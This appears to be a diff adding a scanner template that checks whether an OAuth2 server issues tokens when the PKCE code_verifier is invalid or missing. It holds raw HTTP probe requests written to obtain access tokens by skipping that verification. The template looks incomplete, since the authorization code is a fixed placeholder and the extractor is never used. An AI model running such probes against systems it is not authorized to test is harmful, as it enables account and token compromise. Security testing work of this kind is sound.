@@ -1,0 +1,80 @@
+id: medium-api-oauth2-pkce-bypass-attack
+
+info:
+  name: OAuth2 PKCE Bypass Attack
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects OAuth2 PKCE (Proof Key for Code Exchange) bypass vulnerabilities where authorization servers
+    fail to properly validate code_challenge and code_verifier parameters, allowing attackers to
+    intercept authorization codes without the PKCE protection mechanism.
+  reference:
+    - https://tools.ietf.org/html/rfc7636
+    - https://portswigger.net/web-security/oauth/grant-types
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-287
+  tags: oauth,pkce,bypass,authentication,api,medium
+
+http:
+  - raw:
+      - |
+        GET /oauth/authorize?response_type=code&client_id={{client_id}}&redirect_uri={{redirect_uri}}&code_challenge={{code_challenge}}&code_challenge_method=S256&state={{state}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        grant_type=authorization_code&client_id={{client_id}}&code={{code}}&redirect_uri={{redirect_uri}}&code_verifier=invalid_verifier_bypass_attempt
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        grant_type=authorization_code&client_id={{client_id}}&code={{code}}&redirect_uri={{redirect_uri}}
+
+    variables:
+      client_id: "test_client_id"
+      redirect_uri: "https://example.com/callback"
+      code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
+      state: "random_state_value"
+      code: "extracted_auth_code"
+
+    extractors:
+      - type: regex
+        name: auth_code
+        group: 1
+        regex:
+          - 'code=([a-zA-Z0-9_-]+)'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: regex
+        part: body
+        regex:
+          - '"access_token":\s*"[^"]+"'
+          - '"token_type":\s*"bearer"'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"invalid_grant"'
+          - '"error":\s*"invalid_request"'
+          - 'code_verifier.*required'
+
+    stop-at-first-match: true
